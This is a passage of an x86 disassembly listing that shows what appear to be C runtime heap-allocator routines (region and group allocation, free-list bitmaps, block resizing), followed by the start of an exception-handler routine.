  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
